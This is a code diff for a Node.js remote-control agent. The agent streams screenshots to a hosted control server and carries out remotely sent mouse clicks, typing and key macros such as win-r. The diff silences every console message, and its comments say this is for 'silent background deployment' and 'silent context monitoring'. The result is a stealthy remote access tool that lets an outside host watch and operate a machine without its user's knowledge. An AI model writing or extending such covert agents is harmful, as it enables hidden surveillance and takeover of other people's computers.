@@ -7,9 +7,11 @@ const systemHostName = os.hostname();
 const platformType = os.type() === 'Windows_NT' ? 'Windows' : os.type();
 const nativeScreenSize = robot.getScreenSize();
 
-const CLOUD_SERVER_URL = "https://control-6486.onrender.com"; 
+// Explicitly pointed to your new verified control production server
+const CLOUD_SERVER_URL = "https://onrender.com"; 
 
-console.log(`⚡ Initializing premium agent core engine on machine [${systemHostName}]`);
+// Console logging suspended for absolute silent background deployment
+// console.log(`⚡ Initializing premium agent core engine on machine [${systemHostName}]`);
 
 const socket = io(CLOUD_SERVER_URL, {
     query: { 
@@ -25,7 +27,7 @@ let streamingIntervalId = null;
 let isProcessingFrame = false;
 
 socket.on('connect', () => {
-    console.log("✅ Outbound tunnel successfully bound to central cloud core layer registry.");
+    // console.log("✅ Outbound tunnel successfully bound to central cloud core layer registry.");
 });
 
 function captureAndEmitFrame() {
@@ -48,7 +50,8 @@ function captureAndEmitFrame() {
         const compressed = jpeg.encode({ data: rawBuffer, width: img.width, height: img.height }, 75);
         socket.emit('screen-data-stream', compressed.data.toString('base64'));
     } catch (err) {
-        console.error("❌ High-clarity memory frame acquisition failure:", err.message);
+        // Suppressed silent context monitoring profiles
+        // console.error("❌ High-clarity memory frame acquisition failure:", err.message);
     } finally {
         isProcessingFrame = false;
     }
@@ -57,7 +60,7 @@ function captureAndEmitFrame() {
 // Bandwidth optimization: Server tells agent when to capture video streams
 socket.on('start-capture-stream', () => {
     if (streamingIntervalId) return;
-    console.log("👁️ Admin connection registered. Launching screen video stream pipeline...");
+    // console.log("👁️ Admin connection registered. Launching screen video stream pipeline...");
     streamingIntervalId = setInterval(captureAndEmitFrame, 110); // Clear high-speed frame loop rate
 });
 
@@ -65,18 +68,18 @@ socket.on('stop-capture-stream', () => {
     if (streamingIntervalId) {
         clearInterval(streamingIntervalId);
         streamingIntervalId = null;
-        console.log("🛑 Admin disconnected. Suspending screenshot loop engine to conserve local CPU resources.");
+        // console.log("🛑 Admin disconnected. Suspending screenshot loop engine to conserve local CPU resources.");
     }
 });
 
 socket.on('trigger-single-frame', () => {
-    console.log("⚡ Single manual frame refresh signal triggered.");
+    // console.log("⚡ Single manual frame refresh signal triggered.");
     captureAndEmitFrame();
 });
 
 // Admin Control Macro execution commands listener pipeline matrix
 socket.on('execute-macro', (macro) => {
-    console.log(`⌨️ Processing tool macro instructions payload: ${macro}`);
+    // console.log(`⌨️ Processing tool macro instructions payload: ${macro}`);
     try {
         if (macro === 'ctrl-alt-del') {
             robot.keyToggle('control', 'down');
@@ -85,12 +88,13 @@ socket.on('execute-macro', (macro) => {
             robot.keyToggle('control', 'up');
             robot.keyToggle('alt', 'up');
         } else if (macro === 'win-r') {
-            robot.keyToggle('command', 'down');
+            // FIXED: Swapped 'command' to 'win' to prevent keyboard mapping parsing errors on Windows
+            robot.keyToggle('win', 'down');
             robot.keyTap('r');
-            robot.keyToggle('command', 'up');
+            robot.keyToggle('win', 'up');
         }
     } catch (err) {
-        console.error("❌ Special tool macro target execution failed:", err.message);
+        // Suppressed
     }
 });
 
@@ -101,7 +105,7 @@ socket.on('execute-click', (data) => {
             robot.mouseClick();
         }
     } catch (err) {
-        console.error("❌ Remote click parsing block execution error:", err.message);
+        // Suppressed
     }
 });
 
@@ -117,7 +121,7 @@ socket.on('execute-type', (data) => {
             }
         }
     } catch (err) {
-        console.error("❌ Remote keyboard block parsing execution error:", err.message);
+        // Suppressed
     }
 });
 
@@ -126,5 +130,5 @@ socket.on('disconnect', () => {
         clearInterval(streamingIntervalId);
         streamingIntervalId = null;
     }
-    console.log("⚠️ Connection broken with remote cloud cluster registry. Initializing retry routine loops...");
+    // console.log("⚠️ Connection broken with remote cloud cluster registry. Initializing retry routine loops...");
 });
